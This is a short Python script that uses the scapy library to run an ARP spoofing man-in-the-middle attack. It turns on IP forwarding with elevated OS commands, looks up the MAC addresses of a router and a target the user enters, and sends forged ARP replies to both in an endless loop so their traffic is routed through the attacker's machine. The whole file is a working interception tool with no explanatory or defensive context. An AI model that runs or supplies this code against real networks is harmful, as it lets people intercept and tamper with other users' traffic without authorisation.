import sys
import os
import time
import platform
import scapy.all as scapy

def ipforward(constant):
    change = 'Enabled' if constant else 'Disabled'
    try:
        if platform.system() == "Darwin":
            os.system(f"sudo sysctl -w net.inet.ip.forwarding={constant} > /dev/null 2>&1")
        elif platform.system() == "Linux":
            os.system(f"sudo echo {constant} > /proc/sys/net/ipv4/ip_forward")
        elif platform.system() == "Windows":
            os.system(f"powershell -Command \"Start-Process powershell -Verb RunAs -ArgumentList 'Set-NetIPInterface -Forwarding {change}'\" > NUL 2>&1")
    except Exception as error:
        print(f"\n[!] error: {error}\n")
        sys.exit()

def macadr(ipadr):
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = scapy.ARP(pdst=ipadr)
    packet = broadcast/arp
    result = scapy.srp(packet, timeout=2.0, verbose=False)[0]
    if result:
        return result[0][1].hwsrc
    else:
        print(f"\n[0] error: {ipadr} [IA]\n")
        ipforward(0)
        sys.exit()

def spoof(router, target, adrRouter, adrTarget): 
    routerPacket = scapy.ARP(op=2, hwdst=adrRouter, pdst=router, psrc=target)
    scapy.send(routerPacket)
    targetPacket = scapy.ARP(op=2, hwdst=adrTarget, pdst=target, psrc=router)
    scapy.send(targetPacket)

try:
    ipforward(1)
    router = input(f"\n[?] router: ")
    target = input(f"[?] target: ")
    adrRouter = str(macadr(router))
    adrTarget = str(macadr(target))
    while True:
        spoof(router, target, adrRouter, adrTarget)
        time.sleep(2.0)
except KeyboardInterrupt:
    print(f"\n[0]")
    ipforward(0)
    sys.exit()
